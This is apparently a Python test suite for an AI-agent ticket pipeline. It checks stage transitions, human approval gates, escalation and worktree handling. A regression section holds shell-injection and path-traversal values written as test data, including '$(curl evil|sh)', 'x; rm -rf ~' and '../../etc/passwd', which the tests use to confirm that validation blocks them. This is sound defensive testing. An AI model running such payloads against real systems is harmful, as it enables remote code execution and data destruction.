#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.11"
# dependencies = ["pyyaml"]
# ///
"""Checks for the parts that silently rot: the transition table's bounds and
the Tier A gate. Run: ./test_pipeline.py"""
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
import pipeline as P

HERE = Path(__file__).parent


def t(stage, result, counters=None, klass="bugfix"):
    return P.transition(stage, result, counters or {}, klass)


def test_happy_path():
    assert t("new", "-")[0] == "triage"
    assert t("triage", "ok")[0] == "planning"
    assert t("planning", "ok")[0] == "plan-validation"
    assert t("plan-validation", "ok")[0] == "awaiting-approval"
    assert t("implementing", "ok")[0] == "review"
    assert t("review", "ok", klass="bugfix")[0] == "verifying", "bugfix skips holistic"
    assert t("review", "ok", klass="refactor")[0] == "holistic-review"
    assert t("holistic-review", "ok")[0] == "verifying"
    assert t("verifying", "ok")[0] == "done"
    assert t("triage", "rejected")[0] == "rejected"


def test_bounds_escalate_on_the_second_failure():
    for stage, result, key in [
        ("plan-validation", "fail", "plan_validation_attempts"),
        ("review", "fail", "review_loops"),
        ("holistic-review", "fail", "review_loops"),
        ("verifying", "fail", "review_loops"),
        ("implementing", "blocked", "blocked_count"),
    ]:
        nxt, c = t(stage, result)
        assert nxt != "escalated", f"{stage}: first {result} must retry, got {nxt}"
        assert c[key] == 1, f"{stage}: counter not charged"
        nxt, c = t(stage, result, c)
        assert nxt == "escalated", f"{stage}: second {result} must escalate, got {nxt}"
        assert c[key] == 2


def test_review_loops_are_a_shared_budget():
    """A review fail then a holistic fail must escalate -- not reset per stage."""
    _, c = t("review", "fail")
    assert t("holistic-review", "fail", c)[0] == "escalated"


def test_transition_is_pure():
    c = {"review_loops": 0}
    t("review", "fail", c)
    assert c == {"review_loops": 0}, "transition mutated its input"


def test_unknown_result_escalates_rather_than_guesses():
    assert t("review", "lgtm!")[0] == "escalated"
    assert t("implementing", "")[0] == "escalated"


def test_no_agent_can_reach_a_human_gate_or_land_a_ticket():
    """`verifying` is not in agent_stages() -- it is script-run -- so include it
    explicitly, otherwise this asserts nothing about the stage that guards `done`."""
    stages = P.agent_stages() + ["verifying"]
    assert "verifying" not in P.agent_stages(), "verifying must have no agent prompt"
    results = ["ok", "fail", "blocked", "rejected", "junk"]

    for stage in P.agent_stages():          # verifying is the dispatcher's own
        for r in results:
            assert t(stage, r)[0] != "done", \
                f"agent stage `{stage}` reached `done` on result {r!r}"

    for stage in stages:
        for r in results:
            assert t(stage, r)[0] != "awaiting-approval" or stage == "plan-validation", \
                f"`{stage}` reached the human approval gate on {r!r}"

    # only these stages may terminate a ticket, and only on these results
    assert t("triage", "rejected")[0] == "rejected"
    assert t("verifying", "ok")[0] == "done"


# --- gate ------------------------------------------------------------------

FIXTURE = """---
id: TICKET-001
stage: plan-validation
class: bugfix
branch: ticket/001
test_file: test_thing.py::test_broken
files_declared: [thing.py]
counters: {}
lease: {holder: null, expires: null}
---

## Summary
x
## Reproduction
fails
## Digest
thing.py holds it
## Decisions checked
none relevant (grepped: cache, evict)
## Plan
1. fix thing.py
## Acceptance criteria
- `test_broken` passes
## Rollback
revert
## Thread
"""


def _project(ticket_text=FIXTURE, test_passes=False):
    d = Path(tempfile.mkdtemp())
    (d / ".project" / "tickets").mkdir(parents=True)
    (d / ".project" / "pipeline.toml").write_text(
        'test_one = "echo test_broken; exit %d"\n'
        'test_suite = "true"\n'
        'test_suite_without_new = "true"\n' % (0 if test_passes else 1))
    (d / ".project" / "tickets" / "TICKET-001.md").write_text(ticket_text)
    (d / "test_thing.py").write_text("")
    return d


def test_gate_passes_a_complete_ticket():
    d = _project()
    ok, failures = P.gate(d, "TICKET-001")
    assert ok, failures
    assert "Tier A gate: PASS" in (d / ".project/tickets/TICKET-001.md").read_text()
    shutil.rmtree(d)


def test_gate_blocks_an_empty_digest():
    d = _project(FIXTURE.replace("## Digest\nthing.py holds it\n", "## Digest\n"))
    ok, failures = P.gate(d, "TICKET-001")
    assert not ok and any("Digest" in f for f in failures), failures
    shutil.rmtree(d)


def test_gate_blocks_a_test_that_already_passes():
    d = _project(test_passes=True)
    ok, failures = P.gate(d, "TICKET-001")
    assert not ok and any("PASSES" in f for f in failures), failures
    shutil.rmtree(d)


def test_gate_blocks_a_test_that_errors_instead_of_failing():
    """A missing dependency exits non-zero exactly like a real failure."""
    d = _project()
    (d / ".project" / "pipeline.toml").write_text(
        'test_one = "echo ModuleNotFoundError: no module named pytest; exit 1"\n'
        'test_suite = "true"\ntest_suite_without_new = "true"\n')
    ok, failures = P.gate(d, "TICKET-001")
    assert not ok and any("errored rather than failed" in f for f in failures), failures
    shutil.rmtree(d)


def test_project_commands_do_not_inherit_the_dispatchers_venv():
    """Assert the stripping actually happens, rather than passing by luck when
    the suite is run outside a venv."""
    fake = "/tmp/fake-venv-xyz"
    saved = dict(os.environ)
    os.environ["VIRTUAL_ENV"] = fake
    os.environ["PYTHONPATH"] = "/tmp/leak"
    os.environ["PATH"] = f"{fake}/bin:/usr/bin"
    try:
        env = P.project_env()
    finally:
        os.environ.clear(); os.environ.update(saved)
    assert "VIRTUAL_ENV" not in env
    assert "PYTHONPATH" not in env
    assert env["PATH"] == "/usr/bin", env["PATH"]


def test_gate_blocks_empty_files_declared():
    d = _project(FIXTURE.replace("files_declared: [thing.py]", "files_declared: []"))
    ok, failures = P.gate(d, "TICKET-001")
    assert not ok and any("files_declared" in f for f in failures), failures
    shutil.rmtree(d)


def test_gate_blocks_a_vacuous_acceptance_criterion():
    d = _project(FIXTURE.replace("- `test_broken` passes", "- code should be clean"))
    ok, failures = P.gate(d, "TICKET-001")
    assert not ok and any("names no test" in f for f in failures), failures
    shutil.rmtree(d)


def test_escalation_clears_the_lease_so_a_human_can_resume():
    d = _project()
    path = d / ".project/tickets/TICKET-001.md"
    meta, body = P.load_ticket(path)
    meta["lease"] = {"holder": "x", "expires": "2999-01-01T00:00:00+00:00"}
    P.save_ticket(path, meta, body)
    meta, body = P.load_ticket(path)
    P.escalate(path, meta, body, "test")
    meta, _ = P.load_ticket(path)
    assert meta["stage"] == "escalated"
    assert not P.lease_active(meta), "a leased escalated ticket cannot be resumed"
    shutil.rmtree(d)


def test_every_stage_prompt_declares_its_config():
    """A stage is one self-contained file: prompt plus model/effort/write."""
    for stage in P.agent_stages():
        cfg = P.stage_config(stage)
        assert cfg.get("model"), f"{stage}: no model in frontmatter"
        assert isinstance(cfg.get("write"), bool), f"{stage}: no write flag"
    assert P.is_readonly("review") and P.is_readonly("plan-validation")
    assert not P.is_readonly("implementing")


def test_composed_prompt_has_common_rules_and_no_frontmatter():
    f = P.compose_prompt("review")
    text = f.read_text()
    f.unlink()
    assert "Failure protocol" in text, "shared rules missing"
    assert "Your stage: review" in text
    assert not text.startswith("---"), "frontmatter leaked into the system prompt"
    assert "model:" not in text.split("## Your stage")[0].split("```")[0]


def test_every_stage_named_by_the_state_machine_has_a_prompt():
    reachable = {t(s, r)[0] for s in P.agent_stages()
                 for r in ["ok", "fail", "blocked", "rejected"]}
    for stage in reachable - P.TERMINAL - {"awaiting-approval", "verifying"}:
        assert (P.STAGES_DIR / f"{stage}.md").is_file(), f"no prompt for `{stage}`"


def test_only_the_owning_stage_can_set_a_frontmatter_field():
    meta = {"files_declared": ["a.py"], "test_file": "t.py::x"}
    P.apply_claims(meta, "review", {"files_declared": ["z.py"], "test_file": "other"})
    assert meta == {"files_declared": ["a.py"], "test_file": "t.py::x"}, \
        "a review stage rewrote fields it does not own"

    P.apply_claims(meta, "implementing", {"files_declared": ["b.py"]})
    assert meta["files_declared"] == ["a.py", "b.py"], "implementation may only add files"

    P.apply_claims(meta, "planning", {"files_declared": ["c.py"]})
    assert meta["files_declared"] == ["c.py"], "planning owns the declared set"


def test_overlapping_tickets_do_not_run_together():
    mine = {"files_declared": ["shared.py", "a.py"]}
    assert P.files_conflict(mine, [{"files_declared": ["shared.py"]}])
    assert not P.files_conflict(mine, [{"files_declared": ["b.py"]}])
    assert not P.files_conflict(mine, []), "nothing in flight cannot conflict"
    assert not P.files_conflict({"files_declared": []}, [{"files_declared": ["a.py"]}])


def test_stage_settings_register_the_guard_as_a_pretooluse_hook():
    import json
    f = P.stage_settings("implementing", P.stage_config("implementing"))
    data = json.loads(f.read_text()); f.unlink()
    entry = data["hooks"]["PreToolUse"][0]
    assert entry["matcher"] == "Bash"
    assert entry["hooks"][0]["command"].endswith("dangerous-commands.py")
    assert Path(entry["hooks"][0]["command"]).is_file(), "hook path does not exist"


def test_every_stage_that_can_run_bash_has_the_guard():
    for stage in P.agent_stages():
        assert "dangerous-commands" in (P.stage_config(stage).get("hooks") or []), \
            f"{stage} runs Bash with no guard"


def test_declared_skills_reach_the_prompt():
    f = P.compose_prompt("implementing")
    text = f.read_text(); f.unlink()
    assert "/superpowers:test-driven-development" in text


def test_planning_can_park_for_a_human_and_come_back():
    assert t("planning", "needs-input")[0] == "needs-input"
    assert "needs-input" in P.HUMAN_GATES, "the dispatcher would spawn an agent on it"
    assert t("planning", "needs-input")[1] == {}, "asking a question is not a failure"


def test_decision_is_recorded_when_a_ticket_lands():
    d = _project(FIXTURE.replace("## Rollback\nrevert",
                                 "## Decisions\nkeep the explicit flush; without it the buffer leaks\n## Rollback\nrevert"))
    path = d / ".project/tickets/TICKET-001.md"
    meta, body = P.load_ticket(path)
    did = P.record_decision(d, meta, body)
    text = (d / ".project/decisions" / f"{did}.md").read_text()
    assert "buffer leaks" in text and "TICKET-001" in text, text
    shutil.rmtree(d)


def test_no_decisions_section_records_nothing():
    d = _project()
    meta, body = P.load_ticket(d / ".project/tickets/TICKET-001.md")
    assert P.record_decision(d, meta, body) is None
    shutil.rmtree(d)


# --- regressions from the adversarial review -----------------------------

def test_frontmatter_that_reaches_a_shell_is_validated():
    ok = {"id": "TICKET-001", "branch": "ticket/001",
          "test_file": "tests/t.py::test_x", "files_declared": ["src/a.py"]}
    assert P.validate_meta(ok) == []
    for field, value in [
        ("test_file", "t.py::x; touch /tmp/PWNED"),
        ("branch", "x; rm -rf ~"),
        ("id", "$(curl evil|sh)"),
        ("id", "../../etc/passwd"),
        ("id", "/tmp/elsewhere"),
        ("stage", "done-ish"),
    ]:
        assert P.validate_meta({**ok, field: value}), f"{field}={value!r} accepted"
    assert P.validate_meta({**ok, "files_declared": ["../../etc/passwd"]})
    assert P.validate_meta({**ok, "files_declared": ["/etc/passwd"]})


def test_shell_injection_through_test_file_is_dead():
    """The gate runs the project's test command; test_file comes from an agent."""
    d = _project()
    marker = d / "PWNED"
    path = d / ".project/tickets/TICKET-001.md"
    meta, body = P.load_ticket(path)
    meta["test_file"] = f"test_thing.py::test_x; touch {marker}"
    P.save_ticket(path, meta, body)
    (d / ".project" / "pipeline.toml").write_text(
        'test_one = "echo {test}"\ntest_suite = "true"\n'
        'test_suite_without_new = "echo {test}"\n')
    assert P.validate_meta(meta), "validation must reject it before anything runs"
    P.gate(d, "TICKET-001")
    assert not marker.exists(), "command substitution executed"
    shutil.rmtree(d)


def test_control_fields_are_the_dispatchers_alone():
    assert {"stage", "counters", "branch", "id", "lease"} <= P.CONTROL_FIELDS
    for field in ("test_file", "files_declared"):
        assert field not in P.CONTROL_FIELDS, f"{field} is claimed via the sidecar"


def test_escalated_tickets_keep_their_worktree():
    assert "escalated" in P.TERMINAL
    assert "escalated" not in P.CLEANUP_STAGES, \
        "removing it destroys the uncommitted evidence a human was called for"
    assert P.CLEANUP_STAGES == {"done", "rejected"}


def test_an_acceptance_criterion_must_name_something_test_shaped():
    d = _project(FIXTURE.replace("- `test_broken` passes", "- latency drops below `10ms`"))
    ok, failures = P.gate(d, "TICKET-001")
    assert not ok and any("names no test" in f for f in failures), failures
    shutil.rmtree(d)

    d = _project(FIXTURE.replace("- `test_broken` passes",
                                 "- `tests/test_cache.py::test_evicts` passes"))
    ok, failures = P.gate(d, "TICKET-001")
    assert ok, failures
    shutil.rmtree(d)


def test_a_result_verdict_survives_a_crash_before_it_is_applied():
    d = _project()
    P.result_file(d, "TICKET-001").write_text("result: ok\nsummary: x\n")
    assert P.read_result(d, "TICKET-001", keep=True) == {"result": "ok", "summary": "x"}
    assert P.result_file(d, "TICKET-001").is_file(), \
        "the verdict must stay on disk until it has been acted on"
    P.drop_result(d, "TICKET-001")
    assert P.read_result(d, "TICKET-001") is None
    shutil.rmtree(d)


def test_a_corrupt_result_file_does_not_crash_the_dispatcher():
    d = _project()
    P.result_file(d, "TICKET-001").write_text("{[not: valid: yaml")
    assert P.read_result(d, "TICKET-001") == {}
    P.result_file(d, "TICKET-001").write_text("- a list, not a mapping")
    assert P.read_result(d, "TICKET-001") == {}
    shutil.rmtree(d)


def test_resume_refuses_a_stage_that_does_not_exist():
    d = Path(tempfile.mkdtemp())
    run = lambda *a: subprocess.run([sys.executable, str(HERE / "pipeline.py"),
                                     "--project", str(d), *a],
                                    capture_output=True, text=True)
    run("new", "t")
    r = run("resume", "TICKET-001", "--stage", "implementng")   # typo
    assert r.returncode != 0 and "is not a stage" in r.stderr, r
    r = run("resume", "TICKET-001", "--stage", "planning")
    assert r.returncode == 0, r.stderr
    shutil.rmtree(d)


def _git_project():
    d = Path(tempfile.mkdtemp())
    sh = lambda c: subprocess.run(c, shell=True, cwd=d, capture_output=True, text=True)
    sh("git init -qb main && git config user.email t@t && git config user.name t")
    (d / "f.py").write_text("base\n")
    sh("git add -A && git commit -qm init")
    (d / ".project" / "tickets").mkdir(parents=True)
    (d / ".project" / "pipeline.toml").write_text(
        'test_one="true"\ntest_suite="true"\ntest_suite_without_new="true"\nbase="main"\n')
    return d, sh


def test_recreating_a_worktree_never_resets_the_branch():
    """`git worktree add -B` resets to base -- it would silently discard every
    commit a ticket made before it was escalated or resumed."""
    d, sh = _git_project()
    meta = {"id": "TICKET-001", "branch": "ticket/001"}
    cfg = {"base": "main"}
    wt = P.ensure_worktree(d, meta, cfg)
    (wt / "new.py").write_text("ticket work\n")
    subprocess.run("git add -A && git commit -qm 'ticket commit'", shell=True,
                   cwd=wt, capture_output=True)
    before = sh("git rev-parse ticket/001").stdout.strip()

    P.drop_worktree(d, meta)
    P.ensure_worktree(d, meta, cfg)          # the resume path
    after = sh("git rev-parse ticket/001").stdout.strip()

    assert after == before, "recreating the worktree discarded the ticket's commits"
    assert "ticket commit" in sh("git log --oneline ticket/001").stdout
    shutil.rmtree(d, ignore_errors=True)


def test_an_escalated_ticket_keeps_its_worktree_and_its_evidence():
    d, _ = _git_project()
    meta = {"id": "TICKET-001", "branch": "ticket/001"}
    wt = P.ensure_worktree(d, meta, {"base": "main"})
    (wt / "half-finished.py").write_text("uncommitted evidence\n")

    (d / ".project/tickets/TICKET-001.md").write_text(
        FIXTURE.replace("stage: plan-validation", "stage: escalated"))
    P.start(d, d / ".project/tickets/TICKET-001.md", P.harness("fake"), {})

    assert wt.is_dir(), "the worktree a human was escalated to inspect was deleted"
    assert (wt / "half-finished.py").exists()
    shutil.rmtree(d, ignore_errors=True)


def test_a_done_ticket_does_release_its_worktree():
    d, _ = _git_project()
    meta = {"id": "TICKET-001", "branch": "ticket/001"}
    wt = P.ensure_worktree(d, meta, {"base": "main"})
    (d / ".project/tickets/TICKET-001.md").write_text(
        FIXTURE.replace("stage: plan-validation", "stage: done"))
    P.start(d, d / ".project/tickets/TICKET-001.md", P.harness("fake"), {})
    assert not wt.is_dir(), "a finished ticket should not leave a worktree behind"
    shutil.rmtree(d, ignore_errors=True)


def test_ticket_roundtrips():
    d = _project()
    p = d / ".project/tickets/TICKET-001.md"
    meta, body = P.load_ticket(p)
    P.save_ticket(p, meta, body)
    assert P.load_ticket(p)[0] == meta
    assert P.sections(body)["Digest"] == "thing.py holds it"
    shutil.rmtree(d)


def test_cli_new_then_status():
    d = Path(tempfile.mkdtemp())
    run = lambda *a: subprocess.run([sys.executable, str(HERE / "pipeline.py"),
                                     "--project", str(d), *a],
                                    capture_output=True, text=True)
    r = run("new", "cache leaks", "--class", "bugfix")
    assert r.returncode == 0, r.stderr
    assert (d / ".project/tickets/TICKET-001.md").is_file()
    r = run("status")
    assert "TICKET-001" in r.stdout and "new" in r.stdout, r.stdout
    r = run("approve", "TICKET-001")
    assert r.returncode != 0, "approve must refuse a ticket that is not awaiting-approval"
    shutil.rmtree(d)


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for fn in fns:
        fn()
        print(f"ok  {fn.__name__}")
    print(f"\n{len(fns)} passed")
